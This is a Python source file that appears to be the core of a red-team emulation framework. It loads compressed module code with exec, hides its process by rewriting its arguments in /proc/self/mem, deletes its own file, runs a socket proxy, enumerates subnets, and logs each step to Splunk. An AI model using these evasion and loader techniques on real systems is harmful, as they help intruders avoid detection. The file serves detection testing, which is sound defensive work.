#!/usr/bin/env python
from __future__ import division, unicode_literals

import atexit
import base64
import httplib
import inspect
import json
import os
import re
import select
import signal
import socket
import ssl
import struct
import sys
import threading
import time
import zlib

ALL_MODULES = []
ALL_MODULES_CODE = '${ALL_CODE_LIST}'
SCRIPT_NAME = b'${SCRIPT_NAME}'
EXECUTION_WINDOW = 0xdeadbeef


class ModuleBase(object):
    VERSION = '0.1.0'

    def __init__(self, identification_banner):
        self._started = False
        self._finished = False
        self._banner = identification_banner

    @property
    def module_name(self):
        return self.__class__.__name__

    @property
    def needs_root(self):
        return False

    @property
    def finished(self):
        return self._finished

    @property
    def started(self):
        return self._started

    @property
    def relative_delay(self):
        # On a scale of 1 (least) to 100 (most) likely to get caught
        raise NotImplementedError('Specify an integer 0 <= relative_delay <= 100')

    @property
    def absolute_duration(self):
        # Number of seconds the module should wait
        # NOTE: This only affects computation of minimum test duration! You're responsible for sleeping!
        raise NotImplementedError('Specify an duration that the module expects to run')

    def util_childproc(self, fname=None, func=None, args=()):
        (r, w) = os.pipe()
        if os.fork() == 0:
            pid = os.fork()
            if pid == 0:
                if fname is not None:
                    os.execv(fname, args)
                elif func is not None:
                    func(*args)
            else:
                os.write(w, str(pid))
            sys.exit(0)
        os.wait()
        pid = int(os.read(r, 8))
        os.close(r)
        os.close(w)
        self.hec_logger('Created a new process', severity='info', process_id=pid)
        return pid

    def util_netconnect(self, host, timeout=60):
        def proxy(_sock, _host, _timeout):
            s = socket.socket()
            s.settimeout(_timeout)
            try:
                s.connect(_host)
                while True:
                    r, _, _ = select.select([_sock, s], [], [], _timeout)
                    if not r:
                        raise Exception  # reached timeout
                    if s in r:
                        if _sock.send(s.recv(1024)) <= 0:
                            raise Exception  # a socket closed
                    if _sock in r:
                        if s.send(_sock.recv(1024)) <= 0:
                            raise Exception  # a socket closed
            except:
                s.close()
                _sock.close()
                sys.exit()
        self.hec_logger('Creating outbound connection', severity='info', host=host)
        parent_sock, child_sock = socket.socketpair(socket.AF_UNIX)
        self.util_childproc(func=proxy, args=(child_sock, host, timeout))
        return parent_sock

    def util_orphanwait(self, pid, timeout=0):
        start = time.time()
        while True:
            if (time.time() - start > timeout) and timeout != 0:
                try:
                    self.hec_logger('Timeout reached, killing process', severity='info', process_id=pid)
                    os.kill(pid, signal.SIGINT)
                except Exception as e:
                    self.hec_logger('Error killing process', process_id=pid, error=str(e))
                break
            try:
                os.kill(pid, 0)
            except OSError:
                self.hec_logger('Process no longer exists, exiting waitloop', severity='debug', pid=pid)
                break
            time.sleep(1)
        return

    def hec_logger(self, message, action='', severity='info', **kwargs):
        event = {
            'project': '${PROJECT_NAME}',
            'severity': severity,
            'action': action,
            'message': message,
            'local_time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        }
        event.update(kwargs)
        data = {
            'source': self.module_name,
            'host': socket.getfqdn(),
            'sourcetype': 'smokeyjab:' + self.module_name,
            'event': json.dumps(event)
        }
        headers = {'Authorization': 'Splunk ${SPLUNK_TOKEN}', 'Content-Type': 'application/json'}
        try:
            https = httplib.HTTPSConnection('${SPLUNK_HOST}', context=ssl._create_unverified_context())
        except:
            # "context" key must not be recognized (should be v2.7.9 but that doesn't seem to be strictly true)
            try:
                https = httplib.HTTPSConnection('${SPLUNK_HOST}')
            except:
                return
        https.request('POST', '/services/collector', body=json.dumps(data), headers=headers)

    def finish(self):
        self.hec_logger('', action='finish')
        self._finished = True

    def start(self):
        self.hec_logger('', action='start')
        self._started = True

    def run(self):
        # Your module functionality here
        raise NotImplementedError('Module functionality undefined')

class Utils(object):
    @staticmethod
    def routes():
        """ returns (iface, net address, subnet, gateway) tuple """
        def lehex2ip(x):
            return socket.inet_ntoa(x.decode('hex')[::-1])
        with open('/proc/net/route') as f:
            for i, line in enumerate(f):
                if i == 0:
                    continue
                line = line.split()
                yield (line[0], lehex2ip(line[1]), lehex2ip(line[7]), lehex2ip(line[2]))

    @staticmethod
    def subnet2list(ip, subnet):
        ipi, = struct.unpack(b'!I', socket.inet_aton(ip))
        maski, = struct.unpack(b'!I', socket.inet_aton(subnet))
        for i in range((ipi & maski) + 1, ipi | (maski ^ 0xffffffff)):
            yield socket.inet_ntoa(struct.pack(b'!I', i))

    @staticmethod
    def cidr2list(ip, cidr):
        ipi, = struct.unpack(b'!I', socket.inet_aton(ip))
        maski = (0xffffffff << (32-cidr)) & 0xffffffff
        for i in range((ipi & maski) + 1, ipi | (maski ^ 0xffffffff)):
            yield socket.inet_ntoa(struct.pack(b'!I', i))

    @staticmethod
    def iface2ip(iface):
        import socket, struct, fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack(b'256s', iface[:15])
        )[20:24])


def hide():
    with open('/proc/self/cmdline', 'rb') as f:
        cmdline = f.read()
    with open('/proc/self/maps') as f:
        maps = f.read()
    stack_start, stack_end = re.search(b'([0-9a-f]+)-([0-9a-f]+).*\[stack\]', maps).groups()
    with open('/proc/self/mem', 'rb+') as mem:
        mem.seek(int(stack_start, 16))
        stack = mem.read(int(stack_end, 16) - int(stack_start, 16))
        cmd_index = stack.find(cmdline)
        arg1_index = stack.find(b'\x00', cmd_index) + 1
        newargs = SCRIPT_NAME + b'\x00' * (len(cmdline) - len(SCRIPT_NAME))
        mem.seek(int(stack_start, 16) + arg1_index)
        mem.write(newargs)
    os.unlink(__file__)
    return


def load_modules(modules_string):
    # exec (marshal.loads(zlib.decompress(base64.b64decode(modules_string))), globals(), locals())
    exec (zlib.decompress(base64.b64decode(modules_string)), globals(), locals())
    is_root = (os.getuid() == 0) or (os.geteuid() == 0)
    for name, item in locals().items():
        if inspect.isclass(item) and issubclass(item, ModuleBase) and getattr(item, 'VERSION', -1) >= 0:
            plugin = item('${REDTEAM_TAG}')
            if plugin.needs_root and not is_root:
                plugin.hec_logger('Module requires root and we are not root: {0}'.format(plugin.module_name),
                                  severity='warning')
                continue
            ALL_MODULES.append(plugin)


def get_all_status():
    statuses = []
    for module in ALL_MODULES:
        statuses.append(module.finished)
    return statuses


def time_breakdown(_s):
    _s, s = divmod(int(_s), 60)
    _s, m = divmod(_s, 60)
    _s, h = divmod(_s, 24)
    return (_s, h, m, s)


def __start__():
    hide()
    load_modules(ALL_MODULES_CODE)
    main = ModuleBase('core')
    main.hec_logger('Starting framework', action='start', severity='info', num_modules=len(ALL_MODULES),
                    pid=os.getpid())
    atexit.register(main.hec_logger, 'Framework is exiting', action='exit', severity='info', pid=os.getpid())
    for module in ALL_MODULES:
        wait_time = module.relative_delay / 100.0 * EXECUTION_WINDOW
        threading.Timer(wait_time, module.run).start()
        main.hec_logger('Spawned a module thread'.format(module.module_name), severity='debug', ioc=module.module_name,
                        delay='{0:>02}:{1:>02}:{2:>02}:{3:>02}'.format(*time_breakdown(wait_time)))
    while not all(get_all_status()):
        # reap/report zombies created by lazy coding... ;-)
        try:
            pid, ret, res = os.wait3(os.WNOHANG)
            main.hec_logger('Cleaned up a zombie process', severity='warning', pid=pid)
        except OSError:
            pass
        # Sleep before polling to keep CPU usage down
        time.sleep(1)
    main.hec_logger('Terminating framework normally', action='finish', severity='info', pid=os.getpid())


if __name__ == '__main__':
    __start__()
